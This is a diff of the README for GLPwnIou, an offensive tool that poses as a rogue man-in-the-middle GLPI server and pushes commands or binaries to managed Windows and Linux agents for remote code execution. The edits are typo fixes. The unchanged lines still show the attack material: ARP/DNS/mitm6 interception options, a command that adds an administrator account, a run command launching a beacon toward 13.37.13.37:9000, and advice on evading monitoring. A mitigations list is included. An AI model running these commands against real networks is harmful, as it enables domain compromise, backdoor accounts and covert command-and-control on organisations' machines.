@@ -1,11 +1,11 @@
 # GLPwnIou
 
-Rogue Man-in-The-Middle GLPI server used to obtain RCE on managed devices. This tool takes advantage of the https://help.glpi-project.org/tutorials/inventory/glpiinventory_deploy feature, which enables a GLPI server to push updates (binaries and/or commands) to a managed linux or windows host.
+Rogue Man-in-The-Middle GLPI server used to obtain RCE on managed devices. This tool takes advantage of the https://help.glpi-project.org/tutorials/inventory/glpiinventory_deploy feature, which enables a GLPI server to push updates (binaries and/or commands) to a managed Linux or windows host.
 
 Prerequisites :
 
 - [ ] A Man-In-the-Middle position. Examples of ways include :
-  - using `mitm6` if IPv6 is enabled
+  - using `MitM6` if IPv6 is enabled
   - editing a DNS entry in the domain
   - ARP spoofing (`bettercap`, `ettercap`) on a flat L2 segment.
 - [ ] One of the following:
@@ -61,7 +61,7 @@ glpwniou --advertise https://glpi.acme.local/deploy ... \
   --cmd 'cmd.exe /c net user pwned P@ssw0rd! /add & net localgroup administrators pwned /add'
 ```
 
-Run a binary on the target : Will execute the binary as is unless you provide the `run-command` parameter. You can optionnaly provide an executable name to be used when dropped on target (make sure to use this name when using custom commands)
+Run a binary on the target : Will execute the binary as is unless you provide the `run-command` parameter. You can optionally provide an executable name to be used when dropped on target (make sure to use this name when using custom commands)
 
 ```bash
 # Execute the binary as is
@@ -76,7 +76,7 @@ glpwniou --advertise https://glpi.acme.local/deploy ... \
   --run-command "./beacon.exe -ip 13.37.13.37 -port 9000"
 ```
 
-> Note that `cmd` and `payload-file` are mutually esclusive. The `advertise` flag does not have to match exactly the `serverURL`, however it will be the path at wich the agent will request the binaries and the server will serve them, so sticking as close as possible to the configured value may help regarding monitoring of suspicious activity.
+> Note that `cmd` and `payload-file` are mutually exclusive. The `advertise` flag does not have to match exactly the `serverURL`, however it will be the path at wich the agent will request the binaries and the server will serve them, so sticking as close as possible to the configured value may help regarding monitoring of suspicious activity.
 
 ### Agents configured to only use HTTP
 
@@ -119,7 +119,7 @@ Coming Soon 😁
 ## Improvements
 
 - More Agent versions support
-- Support for multi-OS concurrent poisonning (send a payload/cmd to Windows and another payload/cmd to linux)
+- Support for multi-OS concurrent poisoning (send a payload/cmd to Windows and another payload/cmd to Linux)
 - Integrated ARP spoofing support like [wsuks](https://github.com/NeffIsBack/wsuks) does
 
 ## Mitigations
@@ -127,11 +127,11 @@ Coming Soon 😁
 - Setup your agents to use HTTPS and check the certificate rather than use HTTP or blindly trust any certificate.
 - Regarding ESC17, please check out [the certipy wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc17-enrollee-supplied-subject-for-server-authentication) for mitigation recommendations. **This is no GLPI vulnerability, the issue lies in the trust chain (a misconfiguration in the ADCS)**
 - Disable the `Deploy` task where it isn't needed
-- Protect angainst/monitor MiTM vectors (disable IPv6 if not used, alert on DNS changes/ARP flooding)
+- Protect against/monitor MitM vectors (disable IPv6 if not used, alert on DNS changes/ARP flooding)
 
 ## Acknowledgements and previous works
 
 - https://github.com/NeffIsBack/wsuks from [@al3x_n3ff](https://x.com/al3x_n3ff?lang=fr) for the inspiration
-- https://labs.itresit.es/2026/02/25/glpi-agent-the-no-cve-that-still-bought-us-domain-compromise/ from [javier_at_labs](https://x.com/javier_at_labs) that randomly published an article on the same topic as the one I was researching
-- https://mustafanafizdurukan.github.io/posts/esc17-wsus-dns-abuse/ from [mustafandurukan](https://twitter.com/mustafandurukan) showcasing the DNS poisonning rather than classical Man in The Middle attack
+- https://labs.itresit.es/2026/02/25/glpi-agent-the-no-cve-that-still-bought-us-domain-compromise/ from [javier_at_labs](https://x.com/javier_at_labs) that happened to concurrently publish an article on the same topic as the one we were researching
+- https://mustafanafizdurukan.github.io/posts/esc17-wsus-dns-abuse/ from [mustafandurukan](https://twitter.com/mustafandurukan) showcasing the DNS poisoning rather than classical Man in The Middle attack
 - https://help.glpi-project.org/tutorials/inventory/secure_agent : The GLPI official documentation
